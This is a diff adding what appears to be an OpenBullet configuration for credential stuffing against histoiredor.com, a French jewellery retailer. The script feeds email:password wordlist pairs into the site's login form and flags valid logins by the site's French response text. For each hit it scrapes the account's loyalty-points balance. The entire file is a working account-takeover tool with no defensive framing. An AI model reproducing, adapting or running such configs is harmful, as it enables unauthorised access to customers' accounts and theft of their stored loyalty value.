@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "Histoire Dor ( Capture )",
+  "SuggestedBots": 10,
+  "LastModified": "2018-07-02T01:09:51.7894521+00:00",
+  "AdditionalInfo": "",
+  "Author": "Marine",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.histoiredor.com/fr/action/thomusers/Login" AutoRedirect=TRUE 
+  CONTENT "usersParam[login]=<USER>&usersParam[password]=<PASS>&usersParam[submit]=Me+connecter" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "autologin[lastlogin]: " 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.histoiredor.com/fr/utilisateur/identification" 
+  HEADER "origin: https://www.histoiredor.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Email ou mot de passe incorrect" 
+    KEY "Merci d'indiquer un mot de passe" 
+    KEY "Merci d'indiquer un mot de passe" 
+    KEY "L'email et le mot de passe sont obligatoires" 
+  KEYCHAIN Success OR 
+    KEY "<strong>Mon résumé de compte</strong>" 
+#GET_POINTS REQUEST GET "https://www.histoiredor.com/fr/compte-client/espace-fidelite" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.histoiredor.com/fr/utilisateur/identification" 
+  HEADER "origin: https://www.histoiredor.com" 
+#CAPTURE_POINTS PARSE "<SOURCE>" LR "Vous cumulez actuellement <em>" "€</em> <span class=\"flashy-text\">" Recursive=FALSE -> CAP "Euro Fidélité" "" "€" 
